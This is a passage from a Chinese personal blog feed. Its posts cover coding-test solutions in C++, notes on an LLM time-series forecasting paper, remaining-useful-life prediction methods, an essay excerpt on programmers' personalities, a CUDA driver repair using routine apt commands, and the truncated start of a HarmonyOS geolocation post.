        <content type="html"><![CDATA[<h1 id="西山居游戏开发SEED种子实习"><a href="#西山居游戏开发SEED种子实习" class="headerlink" title="西山居游戏开发SEED种子实习"></a>西山居游戏开发SEED种子实习</h1><p>2024年秋招笔试题目，仅供参考，请大佬多多指教</p><h1 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h1><p>逆波兰数，TCP，操作系统FIFO，C语言大小端</p><h1 id="填空题"><a href="#填空题" class="headerlink" title="填空题"></a>填空题</h1><p>一道LUA脚本写结果，一道并发存储优化题，计算机系统结构里面的知识</p><h1 id="算法题"><a href="#算法题" class="headerlink" title="算法题"></a>算法题</h1><p>总共三道题目，做出来了两道，最后一道是动态规划，没时间写了</p><h2 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>小明对偶数十分痴迷。当小明拿到一个数组，只有当这个数组的和是偶数才会让小明感到开心。 现在小明有一个数组，小明每次可取出数组中的一个数对其进行整除2的操作。问最少需要多少次操作，才能得到使之开心的数组。 </p><p>输入描述 </p><p>第一行输入为 T ，表示有 T 组数据， 每组数据第一行输入为 n ，表示数组长度， 接下来 n 个正整数 ai ，表示长度为 n 的数组 </p><p>输出描述 </p><p>每组数据输出一个整数，表示最少操作次数</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>CF原题，容易发现，一个数组的元素和要么是奇数要么是偶数，如果一开始是偶数的话那么我们呢就没有必要进行操作，否则我们必须要改变一个数的奇偶性才能把数组变为好的，因为任意两个数之间是不会相互影响的，所以我们不需要同时对两个数进行操作，我们只需要遍历一遍所有的数，记录每一个数改变奇偶性所需要的最少操作次数，那么答案就是所有最小操作次数中的最小值。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">53</span>;<br><span class="hljs-type">int</span> a[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> T;<br>cin&gt;&gt;T;<br><span class="hljs-keyword">while</span>(T--)<br>&#123;<br><span class="hljs-type">int</span> minnum=<span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a[i]);<br>ans+=a[i];<br><span class="hljs-type">int</span> cnt=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span>((a[i]&amp;<span class="hljs-number">1</span>)==((a[i]/<span class="hljs-number">2</span>)&amp;<span class="hljs-number">1</span>)) <br>cnt++,a[i]/=<span class="hljs-number">2</span>;<br>minnum=<span class="hljs-built_in">min</span>(minnum,cnt);<br>&#125;<br><span class="hljs-keyword">if</span>(ans&amp;<span class="hljs-number">1</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,minnum);<br><span class="hljs-keyword">else</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;0&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>小明发现了一张爷爷留下的字条，但是读不通其中的字意。小明这才想起了爷爷之前教过自己一套加密字符的方法。对于任意一个字符串，按照从头部插入，再从尾部插入的方法以打乱字符串的顺序。 如给定一个字符串” kingsoft “，加密过程如下””-&gt;” k “-&gt;” ki “-&gt;” nki “-&gt;”  nkig “-&gt;” snkig “-&gt;” snkigo “-&gt;” fsnkigo “-&gt;” fsnkigot  “小明假定爷爷是用这种方式加密的字符串，请问加密前的字符串是什么</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>模拟题，类似双指针遍历把字符串取出来就行了</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function">string <span class="hljs-title">decrypt</span><span class="hljs-params">(string encrypted)</span> </span>&#123;<br>    string result = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">int</span> len = encrypted.<span class="hljs-built_in">length</span>();<br>    <span class="hljs-type">int</span> mid = len / <span class="hljs-number">2</span> <span class="hljs-number">-1</span>;<br>    result+=encrypted[mid];<br><span class="hljs-comment">//    cout&lt;&lt;encrypted[mid+1]&lt;&lt;endl;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= mid; i++) &#123;<br>        result += encrypted[mid+i];<br>        result += encrypted[mid-i];<br>    &#125;<br>    <span class="hljs-keyword">if</span> (len % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) &#123;<br>        result += encrypted[len<span class="hljs-number">-1</span>];<br>    &#125;<br>    <span class="hljs-comment">//reverse(result.begin(), result.end());</span><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    string encrypted = <span class="hljs-string">&quot;fsnkigot&quot;</span>;<br>    string decrypted = <span class="hljs-built_in">decrypt</span>(encrypted);<br>    cout &lt;&lt; decrypted &lt;&lt; endl; <span class="hljs-comment">// 输出 &quot;kingsoft&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>小明手上有两个长度为 n 的数组 a 和 b ，小明对这两个数组的喜欢程度等于 ai * bi 的和 小明有一张操作卡，可以选择一个区间，将 a 中这个区间进行翻转。该操作卡只能使用一次。 问使用操作卡之后，小明对这两个数组的最大喜欢程度是多少。 ）</p><p>输入描述 </p><p>第一行，一个整数 n ,(1&lt;n&lt;5000) 第二行， n 个整数，表示数组 a ,(1&lt;ai&lt;10000000) </p><p>第二行， n 个整数，表示数组 b ,(1&lt;bi&lt;10000000) ）</p><p>输出描述 </p><p>输出一个数，表示小明的最大喜欢程度 </p><p>输入样例： </p><p>3 </p><p>10 1 1 </p><p>1 10 1 </p><p>输出 </p><p>102</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>一眼动归，写不完了，润</p>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 求职 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文阅读 - 《Large Language Models Are Zero-Shot Time Series Forecasters》</title>
      <link href="/2024/01/34972.html"/>
      <url>/2024/01/34972.html</url>
      
        <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>通过将时间序列编码为数字组成的字符串，我们可以将时间序列预测当做文本中下一个 token预测的框架。通过开发这种方法，我们发现像GPT-3和LLaMA-2这样的大语言模型在下游任务上可以有零样本时间序列外推能力上持平或者超过专门设计的时间序列训练模型。为了促进这种性能表现，我们提出了一种有效token化时间序列并将token上的离散分布转换为在连续数值上高度灵活的密度的方法。我们认为大语言模型在时间序列上的成功源于它们可以自然的表达多模态分布的能力，以及为了简单而出现的偏差和重复，这与许多时间序列中的显著特征类似，例如重复的季节趋势。我们同样展示了大预言模型如何做到在不通过非数字文本进行插补的情况下自然的处理缺失的数据，适应文本的便捷信息，并且回答问题以帮助解释预测。同时我们发现日益增大的模型体积有助于改进其在时间序列上的性能表现，我们也展示了GPT4由于其不同对数字的token化方式以及较差的不确定性校准而表现要比GPT3要差，这可能是类似于RLHF这样的对齐机制干预的结果。</p><h2 id="提出的方法"><a href="#提出的方法" class="headerlink" title="提出的方法"></a>提出的方法</h2><h3 id="Tokenization"><a href="#Tokenization" class="headerlink" title="Tokenization"></a>Tokenization</h3><p>将每个数字用空格分开，并在每个时间节点之间用<code>,</code>分隔，小数点在给定固定精度情况是多余的，可以使用特定的编码方式去掉小数点以节省上下文长度。例如：<br>$$<br>0.123, 1.23, 12.3, 123.0 \rightarrow 1 2 , 1 2 3 , 1 2 3 0 , 1 2 3 0 0<br>$$</p><h3 id="Rescaling"><a href="#Rescaling" class="headerlink" title="Rescaling"></a>Rescaling</h3><p>因为数值有可能非常大，要覆盖那么多数值需要很多的token。因此，在输入之前，会用MinMaxScaler将数值进行缩放，限制数值的范围。</p><h3 id="Sampling-x2F-Forecasting"><a href="#Sampling-x2F-Forecasting" class="headerlink" title="Sampling&#x2F;Forecasting"></a>Sampling&#x2F;Forecasting</h3><p>在每次预测时，都会多次实验采样多组预测值，将多组预测值的中位数或均值作为点预测结果，使得结果更加鲁棒，而且还可以直接作为概率预测的结果（分位数）。</p><h3 id="Continuous-likelihoods"><a href="#Continuous-likelihoods" class="headerlink" title="Continuous likelihoods"></a>Continuous likelihoods</h3><p>虽然LLM的概率分布是离散的（即token是离散的），但是可以将其转换为连续概率密度。<br>如下图所示的例子，假如保留三位小数，则每0.001范围形成一个bin，bin内的所有数值服从均匀分布。如0.537和0.538之间的这个bin内，赋一个均匀分布。这样，LLM的概率分布就成了连续的。<br><img src="http://image.0error.net/2024/Pasted%20image%2020240112203119.png" alt="Continuous likelihoods"><br>首先，假设我们有一个语言模型，它可以生成数字序列，比如小数点后的一串数字。这些数字的概率分布是离散的，因为每个数字都有一个特定的概率。<br>为了将这个离散的概率分布变成连续的，作者采用了一种巧妙的方法。他们把可能的数字值按照一定的规则划分成许多小区间，每个区间都是一个连续的范围。然后，在每个区间内，假设数字的分布是均匀的，也就是说，每个具体的数字在这个区间内出现的概率是一样的。<br>通过这样的构建，整个数字空间被分割成许多这样的区间，每个区间都有一个概率分布。这种方法允许我们将原本离散的数字概率分布转换成一个连续的概率分布。<br>最后，为了在原始输入空间中得到这个连续的概率分布，作者引入了一个变量变换的操作。这个操作确保了我们在处理数据时，可以从离散的数字空间映射到连续的数字空间。<br>总的来说，通过这种方法，尽管我们的模型输出的是离散的数字，但我们可以用一种更灵活、更高分辨率的方式来表示和处理连续的概率分布。</p><h3 id="Language-models-as-flexible-distributions"><a href="#Language-models-as-flexible-distributions" class="headerlink" title="Language models as flexible distributions"></a>Language models as flexible distributions</h3><p>Wasserstein距离，也称为地面距离或水流距离，是一种用于衡量两个概率分布之间差异的数学指标。在这个上下文中，作者使用Wasserstein距离来评估通过训练模型生成的连续概率分布与真实分布之间的相似程度。<br><img src="http://image.0error.net/2024/Pasted%20image%2020240112170317.png" alt="Language models as flexible distributions"><br>具体来说，作者首先在上图所示的各种一维分布上训练了一个小型自回归模型。这些分布包括指数随机变量、均匀分布、学生t分布的混合分布，以及月度牛奶数据集上ARIMA模型的时间序列预测残差的重尾分布。接着，作者计算了生成的概率分布与真实分布之间的Wasserstein距离。<br>Wasserstein距离的计算涉及到将一种分布转换为另一种分布的最佳办法，使得转换的成本最小。在这个上下文中，它衡量了通过模型生成的分布与真实分布之间的“距离”或差异，这个距离值越小，两个分布之间的相似性就越高。<br>通过比较不同模型的Wasserstein距离，作者可以评估模型在处理不同类型的分布（非对称、多模态和重尾分布）时的性能。在这里，十进制自回归语言模型（”十进制 AR”）表现出色，表明它在生成与时间序列数据特征相匹配的概率分布时效果良好。这种评估方法提供了一种量化模型性能的手段，特别是在处理复杂概率分布时。</p><h2 id="Origins-of-Zero-Shot-Performance"><a href="#Origins-of-Zero-Shot-Performance" class="headerlink" title="Origins of Zero-Shot Performance"></a>Origins of Zero-Shot Performance</h2><p><img src="http://image.0error.net/2024/Pasted%20image%2020240112203828.png" alt="Origins of Zero-Shot Performance"><br>假如有一个人工生成的序列，用不同复杂度的模型来拟合它（比如不同次数的多项式函数），然后外推，我们希望找到较小复杂度的模型，既能拟合很好，又不会过拟合，如下图中的复杂度13。这叫奥卡姆剃刀原理。可以发现，LLM的NLL最小的时候，正好对应的是这个复杂度13的模型。也就是说，LLM可以找到数据的低复杂性解释，使他们能够zero-shot外推数值序列。</p><ul><li>Rpetition bias and periodicity：LLM对于重复序列的偏差恰好对应于识别和推断输入中周期结构的能力。</li><li>Arithmetic and trend components：LLM有对于加法和乘法的执行能力</li></ul><p>将多个模式组合在一起是一个更困难的挑战，因为它需要识别复合模式并能够在相同的令牌预算内执行多个操作。假设一个模型可以在一次正向过程中执行复制，在一次反向过程中执行加法，这并不一定意味着它可以同时执行这两项操作。我们发现，尽管GPT-4的执行更一致，GPT-3却能执行这些合成（而这是GPT-4所不能的），如附录E所示。对计算和令牌的限制可能会使这种合成变得不必要地困难，而额外的递归结构，例如来自草稿簿、思想链（CoT）提示或自适应计算，会使这项任务更容易。</p><h2 id="LLM其它特性分析"><a href="#LLM其它特性分析" class="headerlink" title="LLM其它特性分析"></a>LLM其它特性分析</h2><p><img src="http://image.0error.net/2024/Pasted%20image%2020240112201029.png"></p><h3 id="Base-models-and-forecasting-performance"><a href="#Base-models-and-forecasting-performance" class="headerlink" title="Base models and forecasting performance"></a>Base models and forecasting performance</h3><p>如图所示，本文使用OpenAI模型、LLaMA及LLaMA-2模型测量大规模多任务语言理解基准和概率预测误差准确性的研究，展现了当推理性能提高时，预测能力也会提高。</p><h3 id="Chat-Models"><a href="#Chat-Models" class="headerlink" title="Chat Models"></a>Chat Models</h3><p>尽管方便的缩放关系似乎适用于基本模型，但当我们考虑已经为聊天机器人应用程序进行后处理的模型时，这种关系开始破裂。例如，GPT-4在自然语言任务中表现出比GPT-3和LLaMA模型高得多的智能，但将其有效应用于时间序列却变得更加困难。在上图（中间部分）中，展示了GPT-4的预测误差（CRPS）明显大于Darts数据集上的GPT-3。性能下降是GPT-4方法中几个小细节的结果。由于标记化的改变，GPT-4不能轻易地被迫将单个数字标记成一个完整的数字流。由于API的限制，可能性评估也是不允许的，这就是为什么我们只提供CRPS的结果。虽然GPT-4可以在第5节（如附录E所示）中讨论的合成示例中表现良好，但我们发现，在随机数据中，GPT-4的校准比GPT-3的差得多，这可能是由于上述预处理细节以及使用RLHF处理模型的事实，众所周知，RLHF会降低问答任务的校准。GPT-4并不是为聊天功能设计的模型中性能下降的唯一例子。我们在LLaMA-2模型中观察到了同样的现象，它们对每个模型大小都有相应的聊天版本。图7（右）显示，聊天版本的预测误差往往比非聊天版本明显更差，尽管在规模和推理能力方面仍保持趋势。</p><h3 id="Missing-data"><a href="#Missing-data" class="headerlink" title="Missing data"></a>Missing data</h3><p>在实际的时序预测场景中，经常会有缺失值NaNs出现。传统方法是直接插值补齐这些缺失值，但是直接插值显然可能和真实值有些差距。而LLM则无需补齐，直接把NaN这个单词给放到序列句子中就好，比如：<br><img src="http://image.0error.net/2024/Pasted%20image%2020240112201242.png"><br>上面式子中逗号之间没有值的都是缺失值，无需插值，直接插入NaN即可。<br>下图是预测效果，发现对于缺失数据非常多的情况，LLM仍然能够有着很低的负对数似然值，而插值+预测模型这种方式的负对数似然都飘到天上去了。在CRPS这个预测指标上看，LLM的预测效果也是不错的。<br><img src="http://image.0error.net/2024/Pasted%20image%2020240112201307.png"></p><h3 id="Connecting-time-series-and-textual-understanding"><a href="#Connecting-time-series-and-textual-understanding" class="headerlink" title="Connecting time series and textual understanding"></a>Connecting time series and textual understanding</h3><p><img src="http://image.0error.net/2024/Pasted%20image%2020240112201814.png"><br>由于 LLM 是为自然语言和代码而设计的，因此我们可以用有用的文本来增强数值时间序列。我们可以通过提供文本侧信息作为输入，或者通过给定的时间序列产生文本输出来实现这一点。一个有趣的问题是，GPT-4 能否用文本解释其对给定时间序列的理解。我们为 GPT-4 提供了生成合成时间序列的代码，提供了其中一个时间序列的值，然后要求它推断出是哪个函数以零点方式生成了数据，以此来探究 GPT-4 的这一能力。预测准确率如上图所示，其余三行均为 0。在 CoT的提示下，模型的表现比随机概率要好得多；不过，在直接推断数字数据时，它识别模式的能力更强，这表明它对数字的理解与其对文本的理解并不完全相关。在进行预测时，模型经常会解释时间序列的属性，以便从列表中选出正确的候选结果，我们在附录 F 中展示了其中几个解释示例。我们还展示了如何在 Jupyter 笔记本单元格上的一个简单（无提示）的下一个标记预测问题中封装这一任务，说明了为什么我们期望这种能力会随着一个足够强大的语言模型的出现而出现。</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>我们已经证明，通过将数值编码为文本，大型语言模型可以用作预训练时间序列预测器。与其他 “基础 “模型一样，预训练会使模型具有有用的通用模式偏差，而这些偏差会通过架构设计，并随着基础预训练模型的改进而实现性能的自然扩展。由于 LLM 预测器是在语言基础上进行训练的，因此还具有非常规能力，如问题解答。从更广泛的意义上讲，将时间序列预测视为自然语言生成，可以说是将更多能力统一到一个大型、功能强大的模型中的又一举措，在这个模型中，许多任务和模式之间可以共享理解能力。此外，零点预测不需要大量的计算资源、领域专业知识或许多下游训练数据点，就能实现令人信服的广泛性能。<br>虽然 LLM 预测器得益于预训练转换器的优势，但也继承了它们的弱点，其中包括有限的上下文窗口。虽然许多单变量时间序列问题可以在越来越大的上下文窗口内轻松解决，但多变量问题却带来了更大的挑战。最近有几项进展将 LLM 的上下文窗口扩展到了 10-100K 字节。将这些进展与时间序列预测相结合是未来研究的一个特别令人兴奋的方向。使用当前 LLMs 架构的另一个潜在挑战可能是它们在算术和执行递归与组合操作方面的弱点，这可能会限制特别具有挑战性的时间序列。另一方面，许多时间序列并不需要精确的运算。了解这种情况在多大程度上存在，并放宽这种限制，也是未来研究的一个很有前景的方向。除了任何限制之外，研究微调时间序列 LLM 的有效程序也很有前途。我们希望将 LLM 研究与时间序列预测结合起来，为两个领域都带来益处。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文献阅读 </tag>
            
            <tag> TSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>剩余使用寿命（RUL）预测技术</title>
      <link href="/2024/01/18939.html"/>
      <url>/2024/01/18939.html</url>
      
        <content type="html"><![CDATA[<p>#RUL #综述<br>剩余使用寿命(<code>Remaining useful life</code>,即<code>RUL</code>)预测技术是预测与健康管理(PHM)的关键技术。它主要是评估设备的性能状态，指导人们对设备进行更换或维修设备，有效避免由于机器故障而导致的安全问题和经济损失。<br><img src="http://image.0error.net/2024/Pasted%20image%2020231217173148.png" alt="预测类型示意图"><br>剩余使用寿命预测的方法常被分为以下三种：</p><ul><li>基于模型的方法</li><li>基于数据驱动的方法</li><li>混合方法</li></ul><p>下面将针对这三种方法进行逐一介绍。</p><h3 id="1-基于模型-model-based-的方法"><a href="#1-基于模型-model-based-的方法" class="headerlink" title="1. 基于模型(model-based)的方法"></a>1. 基于模型(model-based)的方法</h3><p>基于模型的方法主要考虑两个问题，一是联合参数的估计问题，主要通过状态观察器或滤波器来解决，二是预测问题。</p><h3 id="2-基于数据驱动-data-driven-的方法"><a href="#2-基于数据驱动-data-driven-的方法" class="headerlink" title="2. 基于数据驱动(data-driven)的方法"></a>2. 基于数据驱动(data-driven)的方法</h3><p>数据驱动的方法尝试学习特定的模式和统计特征在历史数据可以表明组件的健康状况。这些模式和趋势可以用来估计组件的原则。RUL估计通常是通过多元模式匹配或推断当前的健康状况一个预定义的阈值。与model-based方法相比,数据驱动的方法一般不需要特定领域的知识和技能,或复杂的现象学描述系统的物理模型。当下，这种方法十分流行。</p><p>数据驱动的方法又可以分为统计学方法和机器学习方法。统计学方法常见有：</p><ul><li>基于回归的模型</li><li>Markov过程。</li></ul><p>对于机器学习方法，也就是人们常说的人工智能(AI)方法,包括PCA、深度学习方法等。目前的最火热的当属深度学习方法，通过建立深度神经网络模型来在监测数据和RUL标签之间建立直接映射，从而达到预测的目的。这种方法目前看来简洁有效，但问题是在网络结构等超参数方面缺乏理论上的可解释性。</p><h3 id="3-混合方法"><a href="#3-混合方法" class="headerlink" title="3. 混合方法"></a>3. 混合方法</h3><p>混合方法通常是基于模型和数据驱动方法的结合。回顾混合预测方法，混合预测算法中最常见的方法是使用数据驱动方法(如神经网络<code>NN</code>)来创建一个映射到状态空间,然后使用一个传感器测量模型的状态空间来建模的演变退化状态。这种方法更全面,结合两个框架的好处。然而,他们仍然深深扎根于构建定制的模型相对特定于应用程序的。创建一个真正的广义混合建模框架仍然是一个虚幻的努力。</p>]]></content>
      
      
      
        <tags>
            
            <tag> RUL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阮一峰博客摘要 - 程序员这个职业，会如何改变一个人的性格？</title>
      <link href="/2023/11/50923.html"/>
      <url>/2023/11/50923.html</url>
      
        <content type="html"><![CDATA[<p>人类行为受到工作环境的强烈影响，你会变成环境要求你成为的样子。 正常人关进监狱，就会变得囚犯般俯首听命，暗中算计；要是当上狱警，就会不由自主地居高临下、残忍霸道。<br>这个实验带给我们的启示就是，要小心你的工作，它会改变你，让你成为另一个人。 很多人都有一种印象，会计师的性格是斤斤计较、对数字格外敏感，律师的性格是重视利益最大化，海关执法人员的性格则是充满怀疑、不信任他人，这就是职业对性格的改变。<br>这不禁让我思考一个问题：程序员这个职业，会如何改变一个人的性格？<br>我能想到的有下面几点。<br>（ 1 ）你会变得习惯孤军奋斗，靠自己解决问题。编程本质上属于个人劳动，不是团队劳动。一段代码终究需要你一个人写出来，不可能两个人合写一个函数，你写上半段，我写下半段。现代软件工程是基于分工的协作，每个人完成自己那份工作，然后才能互相协作。</p><p>（ 2 ）你会习惯孤独。编程非常孤独，日复一日、长时间地与机器打交道，很少与他人面对面交流。如果遇到赶工期，一连好几天，都说不了几句话。我能想到的类似工作，大概只有作家。</p><p>（ 3 ）你必须非常细致，做到谨小慎微。每个细节都要考虑到，任何一个字母、一个小数点都不能写错，每个逻辑条件都要理清。只要有一个疏忽，代码就会无法运行，或者留下安全隐患。</p><p>（ 4 ）强大的心理承受能力。程序员是压力很大的工作，公司越大，压力越大，代码写得慢、写错了、或者写不出来，你都要承担责任。有时候出现重大线上 Bug ，别人在屁股后面催着你，你却迟迟想不出问题出在哪里，又没有办法测试，那种心理压力真会让人崩溃。</p><p>总之，一个人如果没有形成稳定的个性之前，就去当职业程序员，可能就会变成上面这样：不习惯与他人紧密协同，喜欢单干，长时间的孤独劳动，非常重视细节，任何一处都不能偷懒或写错，心理压力巨大。</p><p>如果你想好了，能够接受变成这样的人，可以来当程序员。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 摘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次服务器Cuda驱动崩溃修复过程</title>
      <link href="/2023/11/52988.html"/>
      <url>/2023/11/52988.html</url>
      
        <content type="html"><![CDATA[<h2 id="基本过程"><a href="#基本过程" class="headerlink" title="基本过程"></a>基本过程</h2><p>今天实验室师兄在服务器运行深度学习训练时候得到报错<a href="https://stackoverflow.com/questions/66371130/cuda-initialization-unexpected-error-from-cudagetdevicecount">CUDA initialization: Unexpected error from cudaGetDeviceCount()</a>疑似Cuda与NVIDIA显卡驱动沟通中出现了问题，使用<code>nvidia-smi</code>指令时提示<code>Failed to initialize NVML: Driver/library version mismatch</code>，经过沟通了解到，重启与重新配置Cuda环境均未能解决上述问题。</p><p>根据<a href="https://forums.developer.nvidia.com/t/failed-to-initialize-nvml-driver-library-version-mismatch/190421">社区类似问题的帖子</a>下工程师的指引，使用<code>nvidia-bug-report.sh</code>输出了报错的基本日志，得到如下关键信息</p><blockquote><p>Oct 21 06:40:46 ubuntu-C621-WD12-IPMI kernel: [676742.295632] NVRM: API mismatch: the client has the version 535.113.01, but<br>Oct 21 06:40:46 ubuntu-C621-WD12-IPMI kernel: [676742.295632] NVRM: this kernel module has the version 525.105.17.  Please<br>Oct 21 06:40:46 ubuntu-C621-WD12-IPMI kernel: [676742.295632] NVRM: make sure that this kernel module and all NVIDIA driver<br>Oct 21 06:40:46 ubuntu-C621-WD12-IPMI kernel: [676742.295632] NVRM: components have the same version.</p></blockquote><p>定位基本问题为Cuda版本可能有自动更新，因此跟进<code>/var/log/apt/history.log</code>中，找到关于NVIDIA相关的信息</p><blockquote><p>Install: nvidia-profiler:amd64 (10.1.243-3, automatic), nvidia-cuda-toolkit:amd64 (10.1.243-3), nvidia-visual-profiler:amd64 (10.1.243-3, automatic), nvidia-cuda-dev:amd64 (10.1.243-3, automatic), nvidia-cuda-doc:amd64 (10.1.243-3, automatic), nvidia-cuda-gdb:amd64 (10.1.243-3, automatic)<br>Upgrade: libnvidia-compute-535:amd64 (535.113.01-0ubuntu0.20.04.1, 535.113.01-0ubuntu0.20.04.3)</p></blockquote><p>因此基本可以断定这次出错是由cuda-toolkit更新连带引起的</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>先尝试通过将<code>libnvidia-compute-535</code>版本降到<code>525</code>版本，发现小版本号依然对不上（之前运维没有及时更新），所以考虑将kernel版本升级到535版本</p><p>首先运行<code>sudo apt purge nvidia* libnvidia*</code>准备重新安装，然后运行<code>sudo apt install nvidia-driver-535</code>，再次运行<code>nvidia-smi</code>，问题得解。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>在生产环境中应当尽可能避免做敏感升级和安装行为，在安装前最好检查一下要求的工具链，提前做好准备工作</p>]]></content>
      
      
      
        <tags>
            
            <tag> DL </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HarmonyOS在SDK9版本下FA模型geolocation无法定位问题解决</title>
      <link href="/2023/06/6594.html"/>
      <url>/2023/06/6594.html</url>
      
        <content type="html"><![CDATA[<h1 id="HarmonyOS在SDK9版本下FA模型geolocation无法定位问题解决"><a href="#HarmonyOS在SDK9版本下FA模型geolocation无法定位问题解决" class="headerlink" title="HarmonyOS在SDK9版本下FA模型geolocation无法定位问题解决"></a>HarmonyOS在SDK9版本下FA模型geolocation无法定位问题解决</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>已经在config.json中加入了ohos.permission.LOCATION权限声明，但是在实际开发中，我使用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">geolocation.<span class="hljs-title function_">getCurrentLocation</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">this</span>.<span 